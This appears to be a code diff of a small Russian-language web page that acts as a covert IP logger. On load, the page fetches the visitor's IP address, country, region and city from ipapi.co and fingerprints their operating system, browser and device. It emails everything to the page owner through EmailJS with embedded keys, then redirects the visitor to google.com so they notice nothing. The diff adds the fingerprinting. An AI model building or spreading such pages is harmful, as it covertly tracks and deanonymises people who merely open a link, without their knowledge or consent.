@@ -2,32 +2,57 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title></title>
+  <title>Отправка информации</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
   <script>
-    emailjs.init("TEWzd8Aj5uS0d7yeq"); // твой публичный ключ
+    emailjs.init("TEWzd8Aj5uS0d7yeq"); // Твой публичный ключ
+
+    // Функция для простого определения устройства/ОС/браузера
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+
+      let os = "Неизвестно";
+      if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10";
+      else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+      else if (ua.indexOf("Mac OS X") !== -1) os = "Mac OS";
+      else if (/Android/.test(ua)) os = "Android";
+      else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
+      else if (/Linux/.test(ua)) os = "Linux";
+
+      let browser = "Неизвестно";
+      if (/Chrome/.test(ua)) browser = "Chrome";
+      else if (/Firefox/.test(ua)) browser = "Firefox";
+      else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+      else if (/Edge/.test(ua)) browser = "Edge";
+
+      let device = /Mobile|Android|iPhone|iPad/.test(ua) ? "Мобильное устройство" : "ПК";
+
+      return { os, browser, device, userAgent: ua };
+    }
+
+    const deviceInfo = getDeviceInfo();
 
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
       .then(data => {
-        // отправка письма
         return emailjs.send("service_md495n5", "template_juupnvs", {
           ip: data.ip,
           country: data.country_name,
           region: data.region,
-          city: data.city
+          city: data.city,
+          os: deviceInfo.os,
+          browser: deviceInfo.browser,
+          device: deviceInfo.device,
+          user_agent: deviceInfo.userAgent
         });
       })
       .then(() => {
-        // письмо успешно отправлено — теперь редирект
         window.location.href = 'https://www.google.com';
       })
       .catch(e => {
-        // если ошибка — выводим в консоль
         console.error('Ошибка при отправке письма:', e);
-        // можно всё равно сделать редирект через несколько секунд
         setTimeout(() => {
           window.location.href = 'https://www.google.com';
         }, 3000);
@@ -35,5 +60,3 @@
   </script>
 </body>
 </html>
-
-
